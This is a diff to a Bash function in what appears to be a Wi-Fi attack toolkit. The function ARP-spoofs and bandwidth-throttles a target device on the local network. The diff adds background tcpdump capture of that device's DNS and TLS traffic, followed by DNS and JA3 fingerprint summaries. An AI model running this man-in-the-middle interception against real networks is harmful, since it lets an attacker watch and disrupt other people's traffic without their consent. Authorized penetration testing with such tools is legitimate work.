@@ -27,9 +27,8 @@ if ! command -v arpspoof &>/dev/null; then
 fi
 
 if [[ -z "$iface" ]]; then
-    echo -e "${BOLD_RED}[!]${NC} Select an interface first!"
-    pause
-    return
+    select_interface
+    [[ -z "$iface" ]] && return
 fi
 
 # Interface must have an IP (managed mode)
@@ -158,6 +157,13 @@ echo
 read -p "  Confirm? [y/N] " confirm
 [[ "$confirm" =~ ^[Yy]$ ]] || return
 
+# Temp files for background analysis
+local _core_dir
+_core_dir="$(dirname "${BASH_SOURCE[0]}")"
+local _dns_pcap="/tmp/wificli_dns_$$.pcap"
+local _ja3_pcap="/tmp/wificli_ja3_$$.pcap"
+local _dns_pid="" _ja3_pid=""
+
 # Enable IP forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
@@ -179,10 +185,48 @@ else
     echo -e "${BOLD_RED}[+]${NC} Throttling ${BOLD_GREEN}${target_ip}${NC} at ${BOLD_GREEN}${rate_label}${NC}"
 fi
 
+# Start background DNS capture
+if command -v tcpdump &>/dev/null; then
+    tcpdump -i "$iface" -w "$_dns_pcap" port 53 &>/dev/null &
+    _dns_pid=$!
+    echo -e "${BOLD_CYAN}[+]${NC} ${DIM}DNS capture started${NC}"
+fi
+
+# Start background TLS capture for JA3 analysis
+if [[ -x "${_core_dir}/ja3.sh" ]] && command -v tcpdump &>/dev/null; then
+    tcpdump -i "$iface" -w "$_ja3_pcap" \
+        "tcp port 443 or tcp port 8443 or tcp port 5228" &>/dev/null &
+    _ja3_pid=$!
+    echo -e "${BOLD_CYAN}[+]${NC} ${DIM}TLS capture started${NC}"
+fi
+
 echo
 echo -e "${DIM}  Press Enter to stop...${NC}"
 read
 
+# Stop background captures
+[[ -n "$_dns_pid" ]] && kill "$_dns_pid" 2>/dev/null; wait "$_dns_pid" 2>/dev/null || true
+[[ -n "$_ja3_pid" ]] && kill "$_ja3_pid" 2>/dev/null; wait "$_ja3_pid" 2>/dev/null || true
+
 _throttle_cleanup
+
+# Display DNS intelligence summary
+if [[ -x "${_core_dir}/dns.sh" && -f "$_dns_pcap" ]] && \
+   tcpdump -r "$_dns_pcap" -c 1 &>/dev/null 2>&1; then
+    echo
+    echo -e "${BOLD_CYAN}========== DNS Intelligence ==========${NC}"
+    bash "${_core_dir}/dns.sh" -f "$_dns_pcap"
+fi
+
+# Display JA3 TLS fingerprint summary
+if [[ -x "${_core_dir}/ja3.sh" && -f "$_ja3_pcap" ]] && \
+   tcpdump -r "$_ja3_pcap" -c 1 &>/dev/null 2>&1; then
+    echo
+    echo -e "${BOLD_CYAN}========== TLS Fingerprints (JA3) ==========${NC}"
+    bash "${_core_dir}/ja3.sh" -f "$_ja3_pcap"
+fi
+
+rm -f "$_dns_pcap" "$_ja3_pcap" 2>/dev/null
+
 pause
 }
